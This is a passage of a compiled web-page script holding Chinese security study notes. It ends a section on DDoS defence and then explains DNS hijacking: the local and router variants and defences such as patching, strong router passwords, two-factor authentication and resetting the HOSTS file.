防御产品的核心是"),t("strong",[s._v("检测技术和清洗技术")]),s._v(". 检测技术就是检测网站是否正在遭受 DDoS 攻击, 而清洗技术就是清洗掉异常流量.")]),s._v(" "),t("h5",{attrs:{id:"_5-dns劫持"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_5-dns劫持"}},[s._v("#")]),s._v(" 5.DNS劫持")]),s._v(" "),t("h6",{attrs:{id:"_1-概述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-概述"}},[s._v("#")]),s._v(" (1)概述")]),s._v(" "),t("p",[s._v("DNS 劫持攻击又称为 DNS 重定向攻击, 攻击者劫持用户的 DNS 请求, 错误地解析网站 IP 地址, 从而将用户请求重定向到目标站点.")]),s._v(" "),t("p",[s._v("要执行 DNS 劫持攻击, 攻击者要么在用户的系统上安装恶意软件, 要么通过利用已知漏洞破解 DNS 通信来接管路由器.")]),s._v(" "),t("h6",{attrs:{id:"_2-分类"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-分类"}},[s._v("#")]),s._v(" (2)分类")]),s._v(" "),t("ul",[t("li",[t("strong",[s._v("本地 DNS 劫持攻击")]),s._v(": 攻击者在用户系统上植入恶意软件并"),t("strong",[s._v("修改本地 DNS 设置")]),s._v(", 因此用户的系统现在使用由攻击者控制的恶意 DNS 服务器.")]),s._v(" "),t("li",[t("strong",[s._v("路由器 DNS 劫持攻击")]),s._v(": 攻击者利用"),t("strong",[s._v("路由器")]),s._v("中存在的固件漏洞来覆盖 DNS 设置, 从而影响连接到该路由器的所有用户.")])]),s._v(" "),t("h6",{attrs:{id:"_3-防范手段-4"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_3-防范手段-4"}},[s._v("#")]),s._v(" (3)防范手段")]),s._v(" "),t("ul",[t("li",[s._v("建议使用良好的安全软件和防病毒程序, 并确保定期更新软件. 建议使用公共 DNS 服务器, 最好定期检查 DNS 设置是否已修改, 并确保 DNS 服务器是安全的.")]),s._v(" "),t("li",[s._v("建议使用复杂的密码重置"),t("strong",[s._v("路由器")]),s._v("的默认密码. 使用 DNS 注册器时使用双因素身份验证, 并修补路由器中存在的所有漏洞以避免危害.")]),s._v(" "),t("li",[s._v("如果已被 DNS 劫持, 建议删除 "),t("strong",[s._v("HOSTS")]),s._v(" 文件的内容并"),t("strong",[s._v("重置 Hosts File.")])])]),s._v(" "),t("p",[s._v("‍")])])}),[],!1,null,null,null);t.default=n.exports}}]);